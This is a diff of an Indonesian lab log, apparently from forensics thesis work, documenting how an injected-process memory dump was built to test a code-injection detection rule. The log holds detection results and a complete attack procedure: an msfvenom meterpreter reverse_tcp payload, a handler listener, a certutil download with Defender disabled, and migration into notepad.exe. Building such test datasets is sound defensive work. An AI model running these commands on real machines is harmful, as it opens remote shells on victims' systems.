@@ -203,10 +203,75 @@ hasil: `results/r2_network/`
 
 ---
 
-## Dataset 5–7 — ⏳ BELUM
+## Dataset 5 — `infected_r3_injection` — ✅ SELESAI
+
+**Target:** Rule 3 (code injection) — **terisolasi murni** (R1/R2/R4 sengaja tak menyala)
+**MITRE:** T1055.001 (Process Injection: DLL / Reflective DLL Injection)
+**Q13:** poin 2 (proses legit disusupi kode asing)
+**Prevalensi:** Picus Red Report 2026 — T1055 Process Injection #1 global.
+
+**Nilai untuk sidang:** pelengkap Dataset 4. Kode meterpreter disuntik ke proses
+**sah** `notepad.exe` (nama asli, path `C:\Windows\System32`, induk `explorer.exe`)
+→ **LOLOS R1**; koneksi C2 disenyapkan (`sleep`) sebelum capture → **LOLOS R2**;
+tertangkap **HANYA oleh R3** lewat segmen RWX sisa reflective loader. D4 = "C2
+tanpa injeksi", D5 = "injeksi tanpa C2 aktif".
+
+**Tool:** meterpreter `windows/x64/meterpreter/reverse_tcp` + `migrate` ke proses
+sah + `sleep` (tutup socket, kode tetap resident). Meterpreter dipilih justru
+karena reflective DLL-nya **meninggalkan RWX** — artefak yang diuji R3.
+
+**Prosedur (SELESAI dieksekusi):**
+1. Restore snapshot bersih (host-only, victim IP statis `.130`).
+2. Victim: Defender **Real-time protection OFF** — meterpreter mentah kena
+   signature → `certutil` gagal `Access is denied` saat Defender ON (setara MITRE
+   T1562.001; prasyarat lab). `MsMpEng.exe` tetap jalan → latar RWX realistis.
+3. Kali: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.70.131
+   LPORT=4444 -f exe -o /tmp/AtlasHelper.exe` (+`chmod 644`). Kali #2: `python3 -m
+   http.server 8000`.
+4. Kali: `use exploit/multi/handler`, payload sama, `ExitOnSession false` → `exploit -j`.
+5. Victim: buka **notepad.exe** manual (parent explorer.exe → PID 3404). CMD:
+   `certutil` unduh `AtlasHelper.exe` ke `%TEMP%` → jalankan → **session opened**.
+6. Kali (meterpreter): `getpid` (stager PID 8712) → `ps -S notepad.exe` (PID 3404)
+   → `migrate 3404` → `getpid` konfirmasi 3404. Stager 8712 mati otomatis saat migrate.
+7. Kali: `sleep 300` → "gone to sleep, session closed" (socket C2 tertutup, kode
+   meterpreter tetap resident di notepad).
+8. Victim: `netstat -ano | findstr 192.168.70.131` → kosong → DumpIt (Administrator)
+   → `infected_r3_injection.raw` (5 GB), dalam jendela 300 dtk sebelum reconnect.
+
+**Ground Truth (dikonfirmasi via meterpreter):**
+- Proses tersuntik: **`notepad.exe` PID 3404** (PPID 4944 = `explorer.exe`) — proses sah
+- 2 segmen RWX sisa reflective loader @ `0x22319910000` & `0x22319950000`
+- Stager `AtlasHelper.exe` PID 8712 sudah mati saat migrate → tanpa noise
+
+**Hasil analyzer (5 Juli 2026):**
+| Metrik | Nilai |
+|---|---|
+| Plugin | pslist 147, pstree 5, netscan 53, malfind 20, dlllist 7473, handles 52206 |
+| Total proses | 147 PID |
+| CLEAN | 146 |
+| SUSPICIOUS | 1 |
+| False Positive | 0 |
+
+- **PID 3404 `notepad.exe` — R3=True (PRIMER), R1=R2=R4=False:** `[Rule3] Code
+  injection: 'notepad.exe' punya segmen PAGE_EXECUTE_READWRITE + PrivateMemory di
+  alamat 0x22319910000` (+ `0x22319950000`)
+
+**Verifikasi:**
+- ✅ Target primer R3 tercapai; PID 3404 + 2 segmen RWX cocok ground truth.
+- ✅ **Isolasi R3 sempurna (R1=R2=R4=False)** — notepad sah (nama/path/induk) → R1
+  diam; `sleep` menutup C2 → netscan tanpa ESTABLISHED ke `.131` → R2 diam.
+- ✅ malfind 20 record, hanya 2 (notepad) diflag; 18 sisanya whitelist:
+  `MsMpEng.exe` ×15, `SearchApp.exe` ×2, `smartscreen.ex` ×1 ∈ `LEGIT_RWX_PROCESSES`
+  → R3 tersupresi benar. **0 FP.**
+
+**Lokasi dump:** `D:\forensic_triase\dataset_update\infected_r3_injection.raw` |
+hasil: `results/r3_injection/`
+
+---
+
+## Dataset 6–7 — ⏳ BELUM
 | # | Dataset | Rule | MITRE | Q13 |
 |---|---|---|---|---|
-| 5 | infected_r3_injection | R3 | T1055.001 | (injeksi) |
 | 6 | infected_r4a_dll | R4a | T1574.001/002 | poin 3 |
 | 7 | infected_r4b_lsass | R4b | T1003.001 | poin 5 |
 
